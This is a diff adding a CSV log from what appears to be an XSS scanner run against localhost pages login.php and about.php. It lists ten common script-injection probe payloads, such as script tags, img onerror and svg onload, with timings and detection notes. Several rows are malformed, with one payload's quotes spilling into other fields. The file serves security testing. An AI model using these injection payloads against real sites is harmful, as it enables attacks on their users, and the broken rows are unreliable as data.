@@ -1,0 +1,91 @@
+payload_id,url,method,injection_point,payload,response_time,status_group,html_content_length,reflected_payload_present,is_malicious,notes
+R1,http://localhost:8080/login.php,GET,query_param:q,<script>alert(1)</script>,0.06012153625488281,success,1523,False,False,No XSS indicators found
+R2,http://localhost:8080/login.php,GET,query_param:q,"><script>alert(1)</script>,query_param,Break out of attribute
+R3,';alert(1)//,query_param,JavaScript context break
+R4,<img src=x onerror=alert(1)>,query_param,Image error handler
+R5, onmouseover=alert(1)",0.009799718856811523,success,1523,False,False,No XSS indicators found
+R6,http://localhost:8080/login.php,GET,query_param:q,javascript:alert(1),0.00703740119934082,success,1523,False,False,No XSS indicators found
+R7,http://localhost:8080/login.php,GET,query_param:q,<svg onload=alert(1)>,0.012310981750488281,success,1523,False,False,No XSS indicators found
+R8,http://localhost:8080/login.php,GET,query_param:q,%3Cscript%3Ealert(1)%3C/script%3E,0.014866828918457031,success,1523,False,False,No XSS indicators found
+R9,http://localhost:8080/login.php,GET,query_param:q,&lt;script&gt;alert(1)&lt;/script&gt;,0.01564764976501465,success,1523,False,False,No XSS indicators found
+R10,http://localhost:8080/login.php,GET,query_param:q,<script>alert(document.domain)</script>,0.0068662166595458984,success,1523,False,False,No XSS indicators found
+R1,http://localhost:8080/login.php?q=%3Cscript%3Ealert(1)%3C/script%3E,GET,query_param:q,<script>alert(1)</script>,0.0064427852630615234,success,1523,False,False,No XSS indicators found
+R2,"http://localhost:8080/login.php?q=%3E%3Cscript%3Ealert(1)%3C/script%3E,query_param,Break%20out%20of%20attribute%0D%0AR3,';alert(1)//,query_param,JavaScript%20context%20break%0D%0AR4,%3Cimg%20src=x%20onerror=alert(1)%3E,query_param,Image%20error%20handler%0D%0AR5,%20onmouseover=alert(1)",GET,query_param:q,"><script>alert(1)</script>,query_param,Break out of attribute
+R3,';alert(1)//,query_param,JavaScript context break
+R4,<img src=x onerror=alert(1)>,query_param,Image error handler
+R5, onmouseover=alert(1)",0.006933689117431641,success,1523,False,False,No XSS indicators found
+R6,http://localhost:8080/login.php?q=javascript:alert(1),GET,query_param:q,javascript:alert(1),0.0044291019439697266,success,1523,False,False,No XSS indicators found
+R7,http://localhost:8080/login.php?q=%3Csvg%20onload=alert(1)%3E,GET,query_param:q,<svg onload=alert(1)>,0.0046765804290771484,success,1523,False,False,No XSS indicators found
+R8,http://localhost:8080/login.php?q=%3Cscript%3Ealert(1)%3C/script%3E,GET,query_param:q,%3Cscript%3Ealert(1)%3C/script%3E,0.0055925846099853516,success,1523,False,False,No XSS indicators found
+R9,http://localhost:8080/login.php?q=&lt;script&gt;alert(1)&lt;/script&gt;,GET,query_param:q,&lt;script&gt;alert(1)&lt;/script&gt;,0.0055141448974609375,success,1523,False,False,No XSS indicators found
+R10,http://localhost:8080/login.php?q=%3Cscript%3Ealert(document.domain)%3C/script%3E,GET,query_param:q,<script>alert(document.domain)</script>,0.005277156829833984,success,1523,False,False,No XSS indicators found
+R1,http://localhost:8080/about.php?q=%3Cscript%3Ealert(1)%3C/script%3E,GET,query_param:q,<script>alert(1)</script>,0.005632638931274414,success,4840,False,False,Script indicators: script_tag
+R2,"http://localhost:8080/about.php?q=%3E%3Cscript%3Ealert(1)%3C/script%3E,query_param,Break%20out%20of%20attribute%0D%0AR3,';alert(1)//,query_param,JavaScript%20context%20break%0D%0AR4,%3Cimg%20src=x%20onerror=alert(1)%3E,query_param,Image%20error%20handler%0D%0AR5,%20onmouseover=alert(1)",GET,query_param:q,"><script>alert(1)</script>,query_param,Break out of attribute
+R3,';alert(1)//,query_param,JavaScript context break
+R4,<img src=x onerror=alert(1)>,query_param,Image error handler
+R5, onmouseover=alert(1)",0.002525806427001953,success,4840,False,False,Script indicators: script_tag
+R6,http://localhost:8080/about.php?q=javascript:alert(1),GET,query_param:q,javascript:alert(1),0.0025098323822021484,success,4840,False,False,Script indicators: script_tag
+R7,http://localhost:8080/about.php?q=%3Csvg%20onload=alert(1)%3E,GET,query_param:q,<svg onload=alert(1)>,0.003009796142578125,success,4840,False,False,Script indicators: script_tag
+R8,http://localhost:8080/about.php?q=%3Cscript%3Ealert(1)%3C/script%3E,GET,query_param:q,%3Cscript%3Ealert(1)%3C/script%3E,0.0030059814453125,success,4840,False,False,Script indicators: script_tag
+R9,http://localhost:8080/about.php?q=&lt;script&gt;alert(1)&lt;/script&gt;,GET,query_param:q,&lt;script&gt;alert(1)&lt;/script&gt;,0.0034275054931640625,success,4840,False,False,Script indicators: script_tag
+R10,http://localhost:8080/about.php?q=%3Cscript%3Ealert(document.domain)%3C/script%3E,GET,query_param:q,<script>alert(document.domain)</script>,0.003229856491088867,success,4840,False,False,Script indicators: script_tag
+R1,http://localhost:8080/login.php,GET,query_param:q,<script>alert(1)</script>,0.007432699203491211,success,1523,False,False,No XSS indicators found
+R2,http://localhost:8080/login.php,GET,query_param:q,"><script>alert(1)</script>,query_param,Break out of attribute
+R3,';alert(1)//,query_param,JavaScript context break
+R4,<img src=x onerror=alert(1)>,query_param,Image error handler
+R5, onmouseover=alert(1)",0.00760650634765625,success,1523,False,False,No XSS indicators found
+R6,http://localhost:8080/login.php,GET,query_param:q,javascript:alert(1),0.014484643936157227,success,1523,False,False,No XSS indicators found
+R7,http://localhost:8080/login.php,GET,query_param:q,<svg onload=alert(1)>,0.01595616340637207,success,1523,False,False,No XSS indicators found
+R8,http://localhost:8080/login.php,GET,query_param:q,%3Cscript%3Ealert(1)%3C/script%3E,0.010744810104370117,success,1523,False,False,No XSS indicators found
+R9,http://localhost:8080/login.php,GET,query_param:q,&lt;script&gt;alert(1)&lt;/script&gt;,0.008342266082763672,success,1523,False,False,No XSS indicators found
+R10,http://localhost:8080/login.php,GET,query_param:q,<script>alert(document.domain)</script>,0.008172035217285156,success,1523,False,False,No XSS indicators found
+R1,http://localhost:8080/login.php,GET,query_param:q,<script>alert(1)</script>,0.005258321762084961,success,1523,False,False,No XSS indicators found
+R2,http://localhost:8080/login.php,GET,query_param:q,"><script>alert(1)</script>,query_param,Break out of attribute
+R3,';alert(1)//,query_param,JavaScript context break
+R4,<img src=x onerror=alert(1)>,query_param,Image error handler
+R5, onmouseover=alert(1)",0.01585078239440918,success,1523,False,False,No XSS indicators found
+R6,http://localhost:8080/login.php,GET,query_param:q,javascript:alert(1),0.007552146911621094,success,1523,False,False,No XSS indicators found
+R7,http://localhost:8080/login.php,GET,query_param:q,<svg onload=alert(1)>,0.006122112274169922,success,1523,False,False,No XSS indicators found
+R8,http://localhost:8080/login.php,GET,query_param:q,%3Cscript%3Ealert(1)%3C/script%3E,0.0074346065521240234,success,1523,False,False,No XSS indicators found
+R9,http://localhost:8080/login.php,GET,query_param:q,&lt;script&gt;alert(1)&lt;/script&gt;,0.007976293563842773,success,1523,False,False,No XSS indicators found
+R10,http://localhost:8080/login.php,GET,query_param:q,<script>alert(document.domain)</script>,0.006774425506591797,success,1523,False,False,No XSS indicators found
+R1,http://localhost:8080/login.php,GET,query_param:q,<script>alert(1)</script>,0.006470680236816406,success,1523,False,False,No XSS indicators found
+R2,http://localhost:8080/login.php,GET,query_param:q,"><script>alert(1)</script>,query_param,Break out of attribute
+R3,';alert(1)//,query_param,JavaScript context break
+R4,<img src=x onerror=alert(1)>,query_param,Image error handler
+R5, onmouseover=alert(1)",0.00682830810546875,success,1523,False,False,No XSS indicators found
+R6,http://localhost:8080/login.php,GET,query_param:q,javascript:alert(1),0.00954580307006836,success,1523,False,False,No XSS indicators found
+R7,http://localhost:8080/login.php,GET,query_param:q,<svg onload=alert(1)>,0.010474443435668945,success,1523,False,False,No XSS indicators found
+R8,http://localhost:8080/login.php,GET,query_param:q,%3Cscript%3Ealert(1)%3C/script%3E,0.01245570182800293,success,1523,False,False,No XSS indicators found
+R9,http://localhost:8080/login.php,GET,query_param:q,&lt;script&gt;alert(1)&lt;/script&gt;,0.009104251861572266,success,1523,False,False,No XSS indicators found
+R10,http://localhost:8080/login.php,GET,query_param:q,<script>alert(document.domain)</script>,0.013360738754272461,success,1523,False,False,No XSS indicators found
+R1,http://localhost:8080/login.php,GET,query_param:q,<script>alert(1)</script>,0.008037328720092773,success,1523,False,False,No XSS indicators found
+R2,http://localhost:8080/login.php,GET,query_param:q,"><script>alert(1)</script>,query_param,Break out of attribute
+R3,';alert(1)//,query_param,JavaScript context break
+R4,<img src=x onerror=alert(1)>,query_param,Image error handler
+R5, onmouseover=alert(1)",0.007831811904907227,success,1523,False,False,No XSS indicators found
+R6,http://localhost:8080/login.php,GET,query_param:q,javascript:alert(1),0.0065991878509521484,success,1523,False,False,No XSS indicators found
+R7,http://localhost:8080/login.php,GET,query_param:q,<svg onload=alert(1)>,0.007586956024169922,success,1523,False,False,No XSS indicators found
+R8,http://localhost:8080/login.php,GET,query_param:q,%3Cscript%3Ealert(1)%3C/script%3E,0.0063130855560302734,success,1523,False,False,No XSS indicators found
+R9,http://localhost:8080/login.php,GET,query_param:q,&lt;script&gt;alert(1)&lt;/script&gt;,0.0063245296478271484,success,1523,False,False,No XSS indicators found
+R10,http://localhost:8080/login.php,GET,query_param:q,<script>alert(document.domain)</script>,0.008552789688110352,success,1523,False,False,No XSS indicators found
+R1,http://localhost:8080/login.php,GET,query_param:q,<script>alert(1)</script>,0.00781393051147461,success,1523,False,False,No XSS indicators found
+R2,http://localhost:8080/login.php,GET,query_param:q,"><script>alert(1)</script>,query_param,Break out of attribute
+R3,';alert(1)//,query_param,JavaScript context break
+R4,<img src=x onerror=alert(1)>,query_param,Image error handler
+R5, onmouseover=alert(1)",0.006781578063964844,success,1523,False,False,No XSS indicators found
+R6,http://localhost:8080/login.php,GET,query_param:q,javascript:alert(1),0.0068531036376953125,success,1523,False,False,No XSS indicators found
+R7,http://localhost:8080/login.php,GET,query_param:q,<svg onload=alert(1)>,0.007079362869262695,success,1523,False,False,No XSS indicators found
+R8,http://localhost:8080/login.php,GET,query_param:q,%3Cscript%3Ealert(1)%3C/script%3E,0.00857234001159668,success,1523,False,False,No XSS indicators found
+R9,http://localhost:8080/login.php,GET,query_param:q,&lt;script&gt;alert(1)&lt;/script&gt;,0.009687662124633789,success,1523,False,False,No XSS indicators found
+R10,http://localhost:8080/login.php,GET,query_param:q,<script>alert(document.domain)</script>,0.010134696960449219,success,1523,False,False,No XSS indicators found
+R1,http://localhost:8080/login.php,GET,query_param:q,<script>alert(1)</script>,0.00866246223449707,success,1523,False,False,No XSS indicators found
+R2,http://localhost:8080/login.php,GET,query_param:q,"><script>alert(1)</script>,query_param,Break out of attribute
+R3,';alert(1)//,query_param,JavaScript context break
+R4,<img src=x onerror=alert(1)>,query_param,Image error handler
+R5, onmouseover=alert(1)",0.016724348068237305,success,1523,False,False,No XSS indicators found
+R6,http://localhost:8080/login.php,GET,query_param:q,javascript:alert(1),0.011932611465454102,success,1523,False,False,No XSS indicators found
+R7,http://localhost:8080/login.php,GET,query_param:q,<svg onload=alert(1)>,0.010247945785522461,success,1523,False,False,No XSS indicators found
+R8,http://localhost:8080/login.php,GET,query_param:q,%3Cscript%3Ealert(1)%3C/script%3E,0.006869792938232422,success,1523,False,False,No XSS indicators found
+R9,http://localhost:8080/login.php,GET,query_param:q,&lt;script&gt;alert(1)&lt;/script&gt;,0.01263880729675293,success,1523,False,False,No XSS indicators found
+R10,http://localhost:8080/login.php,GET,query_param:q,<script>alert(document.domain)</script>,0.0106658935546875,success,1523,False,False,No XSS indicators found
